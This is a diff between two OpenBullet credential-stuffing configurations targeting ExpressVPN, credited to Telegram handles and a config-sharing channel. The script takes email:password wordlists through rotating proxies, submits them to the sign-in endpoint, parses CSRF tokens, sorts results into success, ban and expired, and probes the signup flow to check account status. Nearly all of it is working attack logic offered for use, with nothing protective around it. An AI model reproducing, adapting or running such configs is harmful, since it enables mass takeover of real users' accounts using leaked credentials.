@@ -1,12 +1,16 @@
 [SETTINGS]
 {
-  "Name": "ExpressVPN(@hackingtoolsprvi8)",
-  "SuggestedBots": 200,
+  "Name": "expressvpn.com mobile",
+  "SuggestedBots": 80,
   "MaxCPM": 0,
-  "LastModified": "2022-06-07T18:59:44.5278268+01:00",
+  "LastModified": "2022-05-22T16:36:52.4241546+08:00",
   "AdditionalInfo": "",
-  "Author": "@hackingtoolsprvi8",
-  "Version": "1.4.5 [Anomaly]",
+  "RequiredPlugins": [],
+  "Author": "@wanted_boy",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
   "IgnoreResponseErrors": false,
   "MaxRedirects": 8,
   "NeedsProxies": true,
@@ -14,34 +18,16 @@
   "OnlySsl": false,
   "MaxProxyUses": 0,
   "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
   "EncodeData": false,
   "AllowedWordlist1": "MailPass",
   "AllowedWordlist2": "",
   "DataRules": [],
   "CustomInputs": [],
-  "CaptchaUrl": "",
-  "Base64": "",
-  "Grayscale": false,
-  "RemoveLines": false,
-  "RemoveNoise": false,
-  "Dilate": false,
-  "Threshold": 1.0,
-  "DiffKeep": 0.0,
-  "DiffHide": 0.0,
-  "Saturate": false,
-  "Saturation": 0.0,
-  "Transparent": false,
-  "Contour": false,
-  "OnlyShow": false,
-  "ContrastGamma": false,
-  "Contrast": 1.0,
-  "Gamma": 1.0,
-  "Brightness": 1.0,
-  "RemoveLinesMin": 0,
-  "RemoveLinesMax": 0,
   "ForceHeadless": false,
   "AlwaysOpen": false,
   "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
   "DisableNotifications": false,
   "CustomUserAgent": "",
   "RandomUA": false,
@@ -49,7 +35,7 @@
 }
 
 [SCRIPT]
-REQUEST GET "https://www.expressvpn.com/sign-in" 
+#Get REQUEST GET "https://www.expressvpn.com/sign-in" 
   
   HEADER "Host: www.expressvpn.com" 
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36" 
@@ -60,7 +46,7 @@ REQUEST GET "https://www.expressvpn.com/sign-in"
   HEADER "Referer: https://www.expressvpn.com/" 
   HEADER "Upgrade-Insecure-Requests: 1" 
 
-PARSE "<SOURCE>" CSS "[name=authenticity_token]" "value" -> VAR "Token" 
+#Token PARSE "<SOURCE>" CSS "[name=authenticity_token]" "value" -> VAR "Token" 
 
 #Login REQUEST POST "https://www.expressvpn.com/sessions" EncodeContent=TRUE 
   CONTENT "utf8=%E2%9C%93&authenticity_token=<Token>&location_fragment=&redirect_path=&email=<USER>&password=<PASS>&commit=Sign+In" 
@@ -82,7 +68,7 @@ KEYCHECK
   KEYCHAIN Ban OR 
     KEY "<RESPONSECODE>" Contains "403" 
 
-REQUEST GET "https://www.expressvpn.com/order" 
+#Get REQUEST GET "https://www.expressvpn.com/order" 
   
   HEADER "Host: www.expressvpn.com" 
   HEADER "Sec-Ch-Ua: \"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"99\"" 
@@ -99,11 +85,11 @@ REQUEST GET "https://www.expressvpn.com/order"
   HEADER "Accept-Language: en-US,en;q=0.9" 
   HEADER "Connection: close" 
 
-PARSE "<SOURCE>" CSS "[name=csrf-token]" "content" -> VAR "csrfToken" 
+#csrfToken PARSE "<SOURCE>" CSS "[name=csrf-token]" "content" -> VAR "csrfToken" 
 
-FUNCTION URLEncode "<csrfToken>" -> VAR "EncodecsrfToken" 
+#EncodecsrfToken FUNCTION URLEncode "<csrfToken>" -> VAR "EncodecsrfToken" 
 
-REQUEST PUT "https://www.expressvpn.com/signup/depart" 
+#Put REQUEST PUT "https://www.expressvpn.com/signup/depart" 
   CONTENT "{\"email\":\"<USER>\"}" 
   CONTENTTYPE "application/x-www-form-urlencoded" 
   HEADER "Host: www.expressvpn.com" 
@@ -122,30 +108,30 @@ REQUEST PUT "https://www.expressvpn.com/signup/depart"
   HEADER "Accept-Encoding: gzip, deflate" 
   HEADER "Accept-Language: en-US,en;q=0.9" 
 
-FUNCTION URLEncode "<USER>" -> VAR "US" 
+#US FUNCTION URLEncode "<USER>" -> VAR "US" 
 
-REQUEST POST "https://www.expressvpn.com/signup" 
+#Post REQUEST POST "https://www.expressvpn.com/signup" 
   CONTENT "utf8=%E2%9C%93&authenticity_token=<EncodecsrfToken>&signup%5Bpackage_id%5D=3&signup%5Bforter_token%5D=ee18c4842d894947b8bfca305ec82103_1648107562318__UDF43_13ck_tt&signup%5Bpayment_method%5D=6&signup%5Bemail%5D=<US>&signup%5Bfirst_name%5D=&signup%5Blast_name%5D=&signup%5Bzip%5D=&signup%5Bcc_number_is_pasted%5D=0&signup%5Bcc_no%5D=&signup%5Bexpiry_month%5D=&signup%5Bexpiry_year%5D=&signup%5Btwo_digit_expiry_year%5D=&signup%5Bccv%5D=" 
   CONTENTTYPE "application/x-www-form-urlencoded" 
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36" 
   HEADER "origin: https://www.expressvpn.com" 
   HEADER "referer: https://www.expressvpn.com/order" 
 
-PARSE "<ADDRESS>" LR "&wait_for=" "" -> VAR "waitFor" 
+#waitFor PARSE "<ADDRESS>" LR "&wait_for=" "" -> VAR "waitFor" 
 
-PARSE "<SOURCE>" CSS "[name=csrf-token]" "content" -> VAR "csrfToken2" 
+#csrfToken2 PARSE "<SOURCE>" CSS "[name=csrf-token]" "content" -> VAR "csrfToken2" 
 
 KEYCHECK 
   KEYCHAIN Success OR 
     KEY "wait_for: \"" 
 
-FUNCTION Delay "2000" -> VAR "Delay" 
+#Delay FUNCTION Delay "2000" -> VAR "Delay" 
 
 BEGIN SCRIPT JavaScript
 Time = Date.now();
 END SCRIPT -> VARS "Time"
 
-REQUEST GET "https://www.expressvpn.com/signup/waiting?wait_for=<waitFor>&_=<Time>" 
+#Get REQUEST GET "https://www.expressvpn.com/signup/waiting?wait_for=<waitFor>&_=<Time>" 
   
   HEADER "Host: www.expressvpn.com" 
   HEADER "Sec-Ch-Ua: \"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"99\"" 
@@ -162,7 +148,7 @@ REQUEST GET "https://www.expressvpn.com/signup/waiting?wait_for=<waitFor>&_=<Tim
   HEADER "Accept-Encoding: gzip, deflate" 
   HEADER "Accept-Language: en-US,en;q=0.9" 
 
-REQUEST GET "https://www.expressvpn.com/order" 
+#Get REQUEST GET "https://www.expressvpn.com/order" 
   
   HEADER "referer: https://www.expressvpn.com/signup/please_wait?payment_method=1&wait_for=<waitFor>" 
   HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36" 
@@ -171,5 +157,6 @@ KEYCHECK BanOnToCheck=FALSE
   KEYCHAIN Custom "EXPIRED" OR 
     KEY "<SOURCE>" DoesNotContain "Email already has active account" 
 
-FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+SET CAP "Author Telegram" "@wanted_boy"
+SET CAP "Telegram Channel" "https://t.me/OpenBullet_CFGs"
 
